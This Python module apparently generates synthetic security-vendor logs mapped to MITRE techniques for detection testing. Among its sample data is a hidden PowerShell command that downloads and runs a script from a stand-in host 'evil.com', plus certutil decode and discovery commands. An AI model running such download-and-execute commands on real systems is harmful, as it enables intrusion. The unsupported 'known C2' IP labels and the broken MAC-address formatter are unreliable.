"""
Enterprise Vendor Library - Comprehensive Security Vendor Log Generators

This module provides authentic log generators for 20+ enterprise security vendors,
each producing realistic logs with proper format compliance and TTP integration.
"""

import json
import random
import hashlib
import uuid
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import ipaddress
import base64

class VendorCategory(str, Enum):
    ENDPOINT = "endpoint"
    NETWORK = "network" 
    IDENTITY = "identity"
    CLOUD = "cloud"
    EMAIL = "email"
    VULNERABILITY = "vulnerability"
    THREAT_INTEL = "threat_intel"
    SIEM = "siem"
    DECEPTION = "deception"

@dataclass
class VendorProfile:
    """Profile defining vendor characteristics and capabilities."""
    name: str
    category: VendorCategory
    products: List[str]
    formats: List[str]
    typical_volume: Tuple[int, int]  # (min, max) logs per hour
    data_richness: float  # 0.1 to 1.0 - how detailed the logs are
    ttp_coverage: List[str]  # MITRE techniques this vendor typically detects

class EnterpriseVendorLibrary:
    """Comprehensive library of enterprise security vendor log generators."""
    
    def __init__(self):
        self.vendor_profiles = self._initialize_vendor_profiles()
        self.domain_pools = self._initialize_domain_pools()
        self.user_pools = self._initialize_user_pools()
        self.asset_pools = self._initialize_asset_pools()
        
    def _initialize_vendor_profiles(self) -> Dict[str, VendorProfile]:
        """Initialize comprehensive vendor profiles."""
        return {
            # Endpoint Detection & Response
            "microsoft_defender": VendorProfile(
                name="Microsoft Defender for Endpoint",
                category=VendorCategory.ENDPOINT,
                products=["Microsoft Defender ATP", "Windows Defender"],
                formats=["json", "xml", "evtx"],
                typical_volume=(500, 2000),
                data_richness=0.9,
                ttp_coverage=["T1059", "T1055", "T1012", "T1082", "T1027"]
            ),
            "carbon_black": VendorProfile(
                name="VMware Carbon Black",
                category=VendorCategory.ENDPOINT,
                products=["Carbon Black Cloud", "Carbon Black Response"],
                formats=["json", "csv"],
                typical_volume=(300, 1500),
                data_richness=0.8,
                ttp_coverage=["T1055", "T1059", "T1027", "T1105", "T1543"]
            ),
            "symantec_sep": VendorProfile(
                name="Broadcom Symantec Endpoint Protection",
                category=VendorCategory.ENDPOINT,
                products=["Symantec Endpoint Protection", "SEP"],
                formats=["syslog", "csv", "json"],
                typical_volume=(200, 800),
                data_richness=0.6,
                ttp_coverage=["T1566", "T1204", "T1027", "T1486"]
            ),
            "mcafee_epo": VendorProfile(
                name="Trellix (McAfee) ePO",
                category=VendorCategory.ENDPOINT,
                products=["McAfee ePolicy Orchestrator", "Trellix EDR"],
                formats=["syslog", "xml", "json"],
                typical_volume=(250, 1000),
                data_richness=0.7,
                ttp_coverage=["T1204", "T1566", "T1027", "T1055"]
            ),
            
            # Network Security
            "fortinet": VendorProfile(
                name="Fortinet FortiGate",
                category=VendorCategory.NETWORK,
                products=["FortiGate", "FortiOS", "FortiAnalyzer"],
                formats=["syslog", "cef", "json"],
                typical_volume=(1000, 5000),
                data_richness=0.8,
                ttp_coverage=["T1566", "T1071", "T1102", "T1041", "T1090"]
            ),
            "checkpoint": VendorProfile(
                name="Check Point Security Gateway",
                category=VendorCategory.NETWORK,
                products=["Check Point Firewall", "SmartDefense"],
                formats=["syslog", "leef", "json"],
                typical_volume=(800, 3000),
                data_richness=0.7,
                ttp_coverage=["T1071", "T1102", "T1095", "T1041"]
            ),
            "zscaler": VendorProfile(
                name="Zscaler Internet Access",
                category=VendorCategory.NETWORK,
                products=["Zscaler ZIA", "Zscaler ZPA"],
                formats=["json", "csv", "cef"],
                typical_volume=(2000, 8000),
                data_richness=0.9,
                ttp_coverage=["T1071", "T1102", "T1566", "T1041", "T1567"]
            ),
            
            # Email Security
            "proofpoint": VendorProfile(
                name="Proofpoint Email Security",
                category=VendorCategory.EMAIL,
                products=["Proofpoint TAP", "Email Protection"],
                formats=["json", "syslog", "csv"],
                typical_volume=(100, 500),
                data_richness=0.9,
                ttp_coverage=["T1566.001", "T1566.002", "T1204.001", "T1204.002"]
            ),
            "mimecast": VendorProfile(
                name="Mimecast Email Security",
                category=VendorCategory.EMAIL,
                products=["Mimecast Secure Email Gateway"],
                formats=["json", "syslog", "xml"],
                typical_volume=(150, 600),
                data_richness=0.8,
                ttp_coverage=["T1566.001", "T1566.002", "T1204.001"]
            ),
            
            # Identity & Access Management
            "azure_ad": VendorProfile(
                name="Microsoft Azure Active Directory",
                category=VendorCategory.IDENTITY,
                products=["Azure AD", "Entra ID"],
                formats=["json"],
                typical_volume=(500, 2000),
                data_richness=0.9,
                ttp_coverage=["T1078", "T1110", "T1133", "T1136", "T1087"]
            ),
            "ping_identity": VendorProfile(
                name="Ping Identity",
                category=VendorCategory.IDENTITY,
                products=["PingFederate", "PingOne"],
                formats=["json", "syslog"],
                typical_volume=(200, 800),
                data_richness=0.7,
                ttp_coverage=["T1078", "T1110", "T1133"]
            ),
            
            # Cloud Security
            "aws_cloudtrail": VendorProfile(
                name="AWS CloudTrail",
                category=VendorCategory.CLOUD,
                products=["CloudTrail", "AWS Config", "GuardDuty"],
                formats=["json"],
                typical_volume=(1000, 5000),
                data_richness=1.0,
                ttp_coverage=["T1078.004", "T1136.003", "T1098", "T1530", "T1552.001"]
            ),
            "gcp_audit": VendorProfile(
                name="Google Cloud Audit Logs",
                category=VendorCategory.CLOUD,
                products=["Cloud Audit Logs", "Security Command Center"],
                formats=["json"],
                typical_volume=(800, 3000),
                data_richness=0.9,
                ttp_coverage=["T1078.004", "T1136.003", "T1098", "T1530"]
            ),
            
            # Vulnerability Management
            "qualys": VendorProfile(
                name="Qualys VMDR",
                category=VendorCategory.VULNERABILITY,
                products=["Qualys VMDR", "QualysGuard"],
                formats=["json", "xml", "csv"],
                typical_volume=(50, 200),
                data_richness=0.8,
                ttp_coverage=["T1190", "T1210", "T1068"]
            ),
            "tenable": VendorProfile(
                name="Tenable Nessus",
                category=VendorCategory.VULNERABILITY,
                products=["Tenable.io", "Nessus"],
                formats=["json", "xml", "csv"],
                typical_volume=(40, 150),
                data_richness=0.8,
                ttp_coverage=["T1190", "T1210", "T1068", "T1595"]
            ),
            "rapid7": VendorProfile(
                name="Rapid7 InsightVM",
                category=VendorCategory.VULNERABILITY,
                products=["InsightVM", "Nexpose"],
                formats=["json", "xml"],
                typical_volume=(60, 250),
                data_richness=0.9,
                ttp_coverage=["T1190", "T1210", "T1068", "T1595.002"]
            ),
            
            # SIEM & Analytics
            "splunk": VendorProfile(
                name="Splunk Enterprise Security",
                category=VendorCategory.SIEM,
                products=["Splunk ES", "Splunk UBA"],
                formats=["json", "kv", "csv"],
                typical_volume=(10000, 50000),
                data_richness=0.9,
                ttp_coverage=["T1078", "T1110", "T1021", "T1055", "T1027"]
            ),
            "qradar": VendorProfile(
                name="IBM QRadar SIEM",
                category=VendorCategory.SIEM,
                products=["QRadar SIEM", "QRadar UBA"],
                formats=["leef", "json", "syslog"],
                typical_volume=(5000, 25000),
                data_richness=0.8,
                ttp_coverage=["T1078", "T1110", "T1021", "T1055", "T1027"]
            ),
            
            # Threat Intelligence
            "mandiant": VendorProfile(
                name="Mandiant Threat Intelligence",
                category=VendorCategory.THREAT_INTEL,
                products=["Mandiant Advantage", "FireEye HX"],
                formats=["json", "stix", "xml"],
                typical_volume=(100, 500),
                data_richness=1.0,
                ttp_coverage=["T1566", "T1059", "T1055", "T1027", "T1105", "T1071"]
            ),
            "recorded_future": VendorProfile(
                name="Recorded Future",
                category=VendorCategory.THREAT_INTEL,
                products=["Recorded Future Platform"],
                formats=["json", "csv"],
                typical_volume=(50, 200),
                data_richness=0.9,
                ttp_coverage=["T1566", "T1071", "T1102", "T1568"]
            ),
            
            # Deception Technology
            "darktrace": VendorProfile(
                name="Darktrace Cyber AI",
                category=VendorCategory.DECEPTION,
                products=["Darktrace Immune System", "Antigena"],
                formats=["json", "syslog"],
                typical_volume=(200, 1000),
                data_richness=0.9,
                ttp_coverage=["T1021", "T1055", "T1027", "T1071", "T1041"]
            ),
            "attivo": VendorProfile(
                name="Attivo Networks ThreatDefend",
                category=VendorCategory.DECEPTION,
                products=["ThreatDefend Platform"],
                formats=["json", "syslog", "cef"],
                typical_volume=(50, 300),
                data_richness=0.8,
                ttp_coverage=["T1021", "T1087", "T1083", "T1135"]
            )
        }
    
    def _initialize_domain_pools(self) -> Dict[str, List[str]]:
        """Initialize realistic domain pools for different scenarios."""
        return {
            "legitimate": [
                "company.com", "enterprise.org", "business.net", "corp.com",
                "global-corp.com", "techsolutions.com", "manufacturing.com",
                "financialservices.org", "healthcare.net", "consulting.com"
            ],
            "suspicious": [
                "temp-mail.org", "guerrillamail.com", "10minutemail.net",
                "throwaway.email", "mailinator.com", "discard.email",
                "yopmail.com", "tempail.com", "maildrop.cc", "temp-mail.net"
            ],
            "malicious": [
                "evil-domain.com", "malware-c2.net", "phishing-site.org",
                "fake-bank.com", "scam-portal.net", "trojan-host.com",
                "ransomware-c2.org", "credential-theft.net", "exploit-kit.com",
                "backdoor-server.net"
            ],
            "cloud_providers": [
                "amazonaws.com", "azure.com", "googleapis.com", "dropbox.com",
                "onedrive.com", "box.com", "salesforce.com", "office365.com",
                "slack.com", "zoom.us"
            ]
        }
    
    def _initialize_user_pools(self) -> Dict[str, List[str]]:
        """Initialize realistic user pools for different scenarios."""
        return {
            "employees": [
                "john.doe", "alice.smith", "bob.wilson", "sarah.johnson",
                "mike.brown", "lisa.davis", "david.miller", "emma.garcia",
                "james.rodriguez", "olivia.martinez", "william.anderson",
                "sophia.taylor", "benjamin.thomas", "isabella.jackson",
                "lucas.white", "mia.harris", "henry.martin", "charlotte.clark"
            ],
            "executives": [
                "ceo", "cto", "cfo", "ciso", "vp.sales", "vp.engineering",
                "director.it", "head.security", "president", "chairman"
            ],
            "service_accounts": [
                "svc-backup", "svc-monitoring", "svc-database", "svc-web",
                "svc-exchange", "svc-sharepoint", "svc-sql", "svc-ldap",
                "svc-jenkins", "svc-ansible", "svc-kubernetes", "svc-docker"
            ],
            "attackers": [
                "admin", "administrator", "root", "test", "guest", "user",
                "backdoor", "hacker", "exploit", "malware", "trojan", "apt"
            ]
        }
    
    def _initialize_asset_pools(self) -> Dict[str, List[str]]:
        """Initialize realistic asset pools for different scenarios.""" 
        return {
            "workstations": [
                "WS-{:04d}".format(i) for i in range(1, 101)
            ] + [
                "LAPTOP-{}".format(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=7))) 
                for _ in range(50)
            ],
            "servers": [
                "SRV-WEB-01", "SRV-DB-01", "SRV-APP-01", "SRV-FILE-01",
                "SRV-MAIL-01", "SRV-DC-01", "SRV-BACKUP-01", "SRV-MONITORING-01",
                "SRV-JENKINS-01", "SRV-SPLUNK-01", "SRV-EXCHANGE-01", "SRV-SHAREPOINT-01"
            ],
            "mobile": [
                "iPhone-{}".format(uuid.uuid4().hex[:8]) for _ in range(20)
            ] + [
                "Android-{}".format(uuid.uuid4().hex[:8]) for _ in range(20)
            ],
            "iot": [
                "CAMERA-{:03d}".format(i) for i in range(1, 26)
            ] + [
                "PRINTER-{:03d}".format(i) for i in range(1, 11)
            ] + [
                "SENSOR-{:03d}".format(i) for i in range(1, 16)
            ]
        }

    # Microsoft Defender Generator
    def generate_microsoft_defender_log(self, ttp=None, timestamp=None, custom_fields=None):
        """Generate Microsoft Defender for Endpoint logs."""
        timestamp = timestamp or datetime.now(timezone.utc)
        custom_fields = custom_fields or {}
        
        # Defender-specific event types
        event_types = {
            "T1059.001": "ProcessCreated",
            "T1055": "ProcessInjection", 
            "T1027": "ObfuscatedFileDetected",
            "T1012": "RegistryAccessed",
            "T1082": "SystemInfoDiscovered"
        }
        
        base_data = {
            "Timestamp": timestamp.isoformat(),
            "DeviceName": random.choice(self.asset_pools["workstations"]),
            "ActionType": event_types.get(ttp.technique_id if ttp else "", "ProcessCreated"),
            "AccountName": random.choice(self.user_pools["employees"]),
            "AccountDomain": "CORP",
            "ProcessId": random.randint(1000, 9999),
            "ProcessCommandLine": self._generate_command_line_for_ttp(ttp),
            "FileName": self._generate_filename_for_ttp(ttp),
            "FolderPath": self._generate_filepath_for_ttp(ttp),
            "SHA256": hashlib.sha256(f"{random.random()}".encode()).hexdigest(),
            "MD5": hashlib.md5(f"{random.random()}".encode()).hexdigest(),
            "ThreatFamily": self._generate_threat_family(ttp),
            "DetectionSource": "Microsoft Defender ATP",
            "Severity": "High" if ttp else "Low",
            "Category": "Malware" if ttp else "Informational",
            "RemoteIP": self._generate_ip_for_context("external"),
            "LocalIP": self._generate_ip_for_context("internal"),
            "RemotePort": random.choice([80, 443, 8080, 3389, 22, 445]),
            "LocalPort": random.randint(1024, 65535)
        }
        
        # Add TTP-specific enrichment
        if ttp:
            if "PowerShell" in ttp.technique_name:
                base_data.update({
                    "PowerShellCommand": "Invoke-Expression",
                    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
                    "ScriptBlockId": str(uuid.uuid4())
                })
            elif "Process Injection" in ttp.technique_name:
                base_data.update({
                    "TargetProcessId": random.randint(1000, 9999),
                    "InjectionMethod": "SetWindowsHookEx",
                    "InjectedDLL": "C:\\temp\\malicious.dll"
                })
        
        base_data.update(custom_fields)
        return base_data

    # Fortinet Generator  
    def generate_fortinet_log(self, ttp=None, timestamp=None, custom_fields=None):
        """Generate Fortinet FortiGate logs."""
        timestamp = timestamp or datetime.now(timezone.utc)
        custom_fields = custom_fields or {}
        
        # FortiGate log types
        log_types = {
            "T1566": "utm",
            "T1071": "traffic", 
            "T1102": "utm",
            "T1041": "traffic",
            "T1090": "traffic"
        }
        
        base_data = {
            "date": timestamp.strftime("%Y-%m-%d"),
            "time": timestamp.strftime("%H:%M:%S"),
            "logid": f"00{random.randint(10000, 99999)}",
            "type": log_types.get(ttp.technique_id if ttp else "", "traffic"),
            "subtype": "forward" if not ttp else "virus",
            "level": "warning" if ttp else "notice",
            "vd": "root",
            "srcip": self._generate_ip_for_context("internal"),
            "srcport": random.randint(1024, 65535),
            "srcintf": "port1",
            "dstip": self._generate_ip_for_context("external" if ttp else "internet"),
            "dstport": random.choice([80, 443, 25, 53, 3389]),
            "dstintf": "port2",
            "proto": random.choice([6, 17]),  # TCP/UDP
            "service": random.choice(["HTTP", "HTTPS", "SMTP", "DNS"]),
            "policyid": random.randint(1, 100),
            "policytype": "policy",
            "action": "blocked" if ttp else "accept",
            "trandisp": "snat",
            "transip": self._generate_ip_for_context("internal"),
            "transport": random.randint(1024, 65535),
            "sentbyte": random.randint(1000, 100000),
            "rcvdbyte": random.randint(1000, 100000),
            "sentpkt": random.randint(10, 1000),
            "rcvdpkt": random.randint(10, 1000)
        }
        
        # Add TTP-specific fields
        if ttp:
            if "Phishing" in ttp.technique_name:
                base_data.update({
                    "virus": "Phishing.URL",
                    "dtype": "Virus",
                    "url": f"http://{random.choice(self.domain_pools['malicious'])}/login.php",
                    "profile": "default",
                    "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                })
            elif "Command and Control" in ttp.technique_name:
                base_data.update({
                    "app": "HTTP",
                    "appcat": "unscanned",
                    "catdesc": "Command and Control",
                    "url": f"http://{random.choice(self.domain_pools['malicious'])}/beacon",
                    "hostname": random.choice(self.domain_pools['malicious'])
                })
        
        base_data.update(custom_fields)
        return base_data

    # Splunk UBA Generator
    def generate_splunk_uba_log(self, ttp=None, timestamp=None, custom_fields=None):
        """Generate Splunk User Behavior Analytics logs."""
        timestamp = timestamp or datetime.now(timezone.utc)
        custom_fields = custom_fields or {}
        
        anomaly_types = {
            "T1078": "CredentialAnomaly",
            "T1110": "BruteForceDetected", 
            "T1021": "LateralMovementAnomaly",
            "T1055": "ProcessAnomalousActivity",
            "T1027": "ObfuscationDetected"
        }
        
        base_data = {
            "_time": timestamp.isoformat(),
            "sourcetype": "ueba:anomaly",
            "source": "Splunk UBA",
            "index": "ueba",
            "anomaly_type": anomaly_types.get(ttp.technique_id if ttp else "", "BaselineDeviation"),
            "user": random.choice(self.user_pools["employees"]),
            "risk_score": random.randint(50, 100) if ttp else random.randint(1, 30),
            "threat_level": "High" if ttp and random.random() > 0.5 else "Medium",
            "peer_group": "office_workers",
            "asset": random.choice(self.asset_pools["workstations"]),
            "src_ip": self._generate_ip_for_context("internal"),
            "dest_ip": self._generate_ip_for_context("external" if ttp else "internal"),
            "bytes_in": random.randint(1000, 1000000),
            "bytes_out": random.randint(1000, 1000000),
            "protocol": random.choice(["TCP", "UDP", "ICMP"]),
            "port": random.choice([80, 443, 3389, 445, 22, 25, 53]),
            "app": random.choice(["web", "ssh", "rdp", "smb", "dns", "email"]),
            "detection_time": timestamp.isoformat(),
            "event_count": random.randint(1, 50),
            "confidence": random.uniform(0.7, 0.99) if ttp else random.uniform(0.3, 0.7)
        }
        
        # Add behavioral context
        if ttp:
            if "Credential Access" in str(ttp.tactic):
                base_data.update({
                    "failed_logins": random.randint(10, 100),
                    "login_times": "unusual_hours",
                    "geo_anomaly": random.choice([True, False]),
                    "new_device": random.choice([True, False])
                })
            elif "Lateral Movement" in str(ttp.tactic):
                base_data.update({
                    "rare_destination": True,
                    "privilege_escalation": random.choice([True, False]),
                    "admin_activity": True,
                    "unusual_process": True
                })
        
        base_data.update(custom_fields)
        return base_data

    # Proofpoint Generator
    def generate_proofpoint_log(self, ttp=None, timestamp=None, custom_fields=None):
        """Generate Proofpoint Email Security logs."""
        timestamp = timestamp or datetime.now(timezone.utc)
        custom_fields = custom_fields or {}
        
        threat_types = {
            "T1566.001": "attachment",
            "T1566.002": "url", 
            "T1204.001": "attachment",
            "T1204.002": "url"
        }
        
        base_data = {
            "ts": timestamp.isoformat(),
            "messageID": f"<{uuid.uuid4()}@{random.choice(self.domain_pools['legitimate'])}>",
            "impostorScore": random.randint(0, 100) if ttp else random.randint(0, 20),
            "malwareScore": random.randint(50, 100) if ttp else random.randint(0, 30),
            "phishScore": random.randint(50, 100) if ttp else random.randint(0, 30),
            "spamScore": random.randint(0, 50),
            "adultscore": random.randint(0, 10),
            "subject": self._generate_email_subject(ttp),
            "sender": self._generate_email_sender(ttp),
            "recipient": f"{random.choice(self.user_pools['employees'])}@{random.choice(self.domain_pools['legitimate'])}",
            "senderIP": self._generate_ip_for_context("external"),
            "messageSize": random.randint(1024, 10240),
            "modulesRun": ["pdr", "spam", "urldefense", "attachment-defense"],
            "quarantineFolder": "Attachment Defense" if ttp else None,
            "quarantineRule": "attachment" if ttp else None,
            "policyRoutes": ["default_inbound"],
            "messageState": "quarantine" if ttp else "delivered",
            "threatsInfoMap": []
        }
        
        # Add threat details if TTP present
        if ttp:
            threat_info = {
                "campaignId": f"campaign_{random.randint(100000, 999999)}",
                "classification": "phish" if "phish" in ttp.technique_name.lower() else "malware",
                "threat": f"{random.choice(['Emotet', 'TrickBot', 'Dridex', 'QBot', 'IcedID'])}",
                "threatId": str(uuid.uuid4()),
                "threatStatus": "active",
                "threatTime": timestamp.isoformat(),
                "threatType": threat_types.get(ttp.technique_id, "attachment"),
                "threatUrl": f"http://{random.choice(self.domain_pools['malicious'])}/payload" if "url" in threat_types.get(ttp.technique_id, "") else None
            }
            base_data["threatsInfoMap"].append(threat_info)
        
        base_data.update(custom_fields)
        return base_data

    # Darktrace Generator
    def generate_darktrace_log(self, ttp=None, timestamp=None, custom_fields=None):
        """Generate Darktrace Cyber AI logs."""
        timestamp = timestamp or datetime.now(timezone.utc)
        custom_fields = custom_fields or {}
        
        model_breaches = {
            "T1021": "Unusual Activity::Multiple Lateral Movement Model",
            "T1055": "Device::Anomalous Process Activity",
            "T1027": "Compromise::Potential Crypto Currency Mining Activity", 
            "T1071": "Compromise::HTTP Beaconing to Rare Destination",
            "T1041": "Compromise::Large Volume of Data Leaving"
        }
        
        base_data = {
            "timestamp": timestamp.isoformat(),
            "uuid": str(uuid.uuid4()),
            "breach_id": random.randint(100000, 999999),
            "model_name": model_breaches.get(ttp.technique_id if ttp else "", "Device::New or Uncommon Service Control"),
            "model_version": "1.0",
            "threat_score": random.uniform(0.7, 1.0) if ttp else random.uniform(0.1, 0.5),
            "confidence": random.uniform(0.8, 1.0) if ttp else random.uniform(0.3, 0.7),
            "device_hostname": random.choice(self.asset_pools["workstations"]),
            "device_ip": self._generate_ip_for_context("internal"),
            "device_mac": self._generate_mac_address(),
            "user_name": random.choice(self.user_pools["employees"]),
            "external_ip": self._generate_ip_for_context("external"),
            "external_hostname": random.choice(self.domain_pools["malicious"]) if ttp else random.choice(self.domain_pools["legitimate"]),
            "port": random.choice([80, 443, 8080, 3389, 445, 22]),
            "protocol": random.choice(["TCP", "UDP"]),
            "bytes_sent": random.randint(1000, 1000000),
            "bytes_received": random.randint(1000, 1000000),
            "connections_count": random.randint(1, 100),
            "duration": random.randint(60, 3600),
            "category": "Cyber AI Detection",
            "subcategory": "Anomalous Network Activity" if ttp else "Baseline Deviation",
            "action": "Monitor",
            "investigation_status": "Open" if ttp else "Closed"
        }
        
        # Add model-specific details
        if ttp:
            if "Lateral Movement" in ttp.technique_name:
                base_data.update({
                    "rare_destination_count": random.randint(5, 20),
                    "credential_reuse_detected": True,
                    "admin_activity_detected": True,
                    "smb_activity": True
                })
            elif "Process Injection" in ttp.technique_name:
                base_data.update({
                    "suspicious_process_name": "svchost.exe",
                    "parent_process": "powershell.exe", 
                    "injection_technique": "SetWindowsHookEx",
                    "memory_region": "heap"
                })
        
        base_data.update(custom_fields)
        return base_data

    # Helper methods for realistic data generation
    def _generate_command_line_for_ttp(self, ttp):
        """Generate realistic command lines based on TTP."""
        if not ttp:
            return "explorer.exe"
            
        commands = {
            "T1059.001": 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload\')"',
            "T1055": "svchost.exe -k NetworkService",
            "T1027": "certutil.exe -decode payload.txt payload.exe",
            "T1012": "reg.exe query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "T1082": "systeminfo.exe > %temp%\\sysinfo.txt",
            "T1021.001": "mstsc.exe /v:192.168.1.100 /u:administrator",
            "T1087.001": "net.exe user /domain",
            "T1083": "dir C:\\Users /s /b > %temp%\\files.txt",
            "T1135": "net.exe view \\\\domain-controller",
            "T1018": "ping.exe -n 1 192.168.1.1 && nslookup google.com"
        }
        
        return commands.get(ttp.technique_id, "cmd.exe /c echo test")
    
    def _generate_filename_for_ttp(self, ttp):
        """Generate realistic filenames based on TTP."""
        if not ttp:
            return "explorer.exe"
            
        filenames = {
            "T1566.001": random.choice(["invoice.exe", "document.scr", "resume.pif", "photo.exe"]),
            "T1059.001": "powershell.exe",
            "T1055": random.choice(["svchost.exe", "rundll32.exe", "regsvr32.exe"]),
            "T1027": random.choice(["legitimate.exe", "update.exe", "installer.exe"]),
            "T1486": random.choice(["ransomware.exe", "cryptor.exe", "locker.exe"])
        }
        
        return filenames.get(ttp.technique_id, "unknown.exe")
    
    def _generate_filepath_for_ttp(self, ttp):
        """Generate realistic file paths based on TTP."""
        if not ttp:
            return "C:\\Windows\\explorer.exe"
            
        paths = {
            "T1566.001": f"C:\\Users\\{random.choice(self.user_pools['employees'])}\\Downloads\\{self._generate_filename_for_ttp(ttp)}",
            "T1059.001": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "T1055": "C:\\Windows\\System32\\svchost.exe",
            "T1027": f"C:\\Temp\\{self._generate_filename_for_ttp(ttp)}",
            "T1486": f"C:\\ProgramData\\{self._generate_filename_for_ttp(ttp)}"
        }
        
        return paths.get(ttp.technique_id, "C:\\Windows\\System32\\unknown.exe")
    
    def _generate_threat_family(self, ttp):
        """Generate threat family names based on TTP."""
        if not ttp:
            return "Clean"
            
        families = {
            "T1566.001": random.choice(["Emotet", "TrickBot", "Dridex", "QBot"]),
            "T1059.001": random.choice(["PowerShell/Obfuscated", "Empire", "Cobalt Strike"]),
            "T1055": random.choice(["Process Hollowing", "DLL Injection", "Reflective Loading"]),
            "T1027": random.choice(["Packed Malware", "Obfuscated Script", "Encrypted Payload"]),
            "T1486": random.choice(["Ransomware", "Crypto Locker", "File Encryptor"])
        }
        
        return families.get(ttp.technique_id, "Generic Malware")
    
    def _generate_email_subject(self, ttp):
        """Generate realistic email subjects.""" 
        if not ttp:
            subjects = [
                "Meeting reminder for tomorrow",
                "Quarterly reports due",
                "Office closure notification",
                "System maintenance scheduled"
            ]
        else:
            subjects = [
                "URGENT: Account suspension notice",
                "Invoice payment required immediately", 
                "Security alert - verify your account",
                "Congratulations! You've won $10,000",
                "Re: Contract document (please review)",
                "IT Support: Please update your password",
                "Package delivery failed - reschedule",
                "Bank notice: Unusual activity detected"
            ]
        
        return random.choice(subjects)
    
    def _generate_email_sender(self, ttp):
        """Generate realistic email senders."""
        if not ttp:
            return f"notifications@{random.choice(self.domain_pools['legitimate'])}"
        else:
            domains = self.domain_pools['suspicious'] + self.domain_pools['malicious']
            return f"{random.choice(['admin', 'security', 'billing', 'support', 'noreply'])}@{random.choice(domains)}"
    
    def _generate_ip_for_context(self, context):
        """Generate IP addresses based on context."""
        if context == "internal":
            return str(ipaddress.IPv4Address(random.randint(int(ipaddress.IPv4Address('10.0.0.1')), int(ipaddress.IPv4Address('10.255.255.254')))))
        elif context == "external":
            # Generate suspicious external IPs (known bad ranges)
            suspicious_ranges = [
                (int(ipaddress.IPv4Address('185.220.100.0')), int(ipaddress.IPv4Address('185.220.102.255'))),  # TOR exit nodes
                (int(ipaddress.IPv4Address('89.248.165.0')), int(ipaddress.IPv4Address('89.248.165.255'))),    # Bulletproof hosting
                (int(ipaddress.IPv4Address('5.188.10.0')), int(ipaddress.IPv4Address('5.188.10.255')))         # Known C2 range
            ]
            start, end = random.choice(suspicious_ranges)
            return str(ipaddress.IPv4Address(random.randint(start, end)))
        else:  # internet
            # Generate legitimate external IPs
            return str(ipaddress.IPv4Address(random.randint(int(ipaddress.IPv4Address('1.1.1.1')), int(ipaddress.IPv4Address('223.255.255.254')))))
    
    def _generate_mac_address(self):
        """Generate realistic MAC addresses."""
        return ":{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
            random.randint(0, 255), random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
        )

    def get_vendor_generator(self, vendor_name: str):
        """Get the appropriate generator function for a vendor."""
        generators = {
            "microsoft_defender": self.generate_microsoft_defender_log,
            "fortinet": self.generate_fortinet_log, 
            "splunk": self.generate_splunk_uba_log,
            "proofpoint": self.generate_proofpoint_log,
            "darktrace": self.generate_darktrace_log,
            # Add more generators as needed
        }
        
        return generators.get(vendor_name.lower().replace(" ", "_").replace("-", "_"))

# Export the main class
__all__ = ["EnterpriseVendorLibrary", "VendorProfile", "VendorCategory"]